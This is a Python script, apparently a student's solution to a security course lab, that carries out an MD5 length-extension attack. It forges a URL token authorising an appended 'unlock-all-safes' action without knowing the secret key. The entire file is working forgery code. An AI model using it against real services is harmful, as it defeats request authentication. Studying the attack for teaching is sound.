from pymd5 import md5, padding
from codecs import decode
import sys
from urllib.parse import quote

# read user input
url = sys.argv[1]

#identify server host name, hash, and message (m)
server = url[: url.find("=") + 1]
ourHash = url[url.find("=") + 1 : url.find("&")]
#ourHash = "6800e4874fb96d8c1a446c28ce195e97" 
m = url[url.find("&") + 1:]

# utilizing code from our instructions
lengthOfM = len(m) + 8
bits = (lengthOfM + len(padding(lengthOfM*8)))*8
h=md5(state=decode(ourHash, "hex"), count=bits)
count = 1
for i in range(500):
	if "action" + str(count) in url:
		count = count + 1
	else:
		pass

x = "&action" + str(count) + "=unlock-all-safes"
h.update(x)
newHash = h.hexdigest()


# get padding
messageLength = len(m)
lengthOfM = messageLength + 8
ourPadding = quote(padding(lengthOfM * 8))

newUrl = server + newHash + "&" + m + ourPadding + x

print(newUrl)
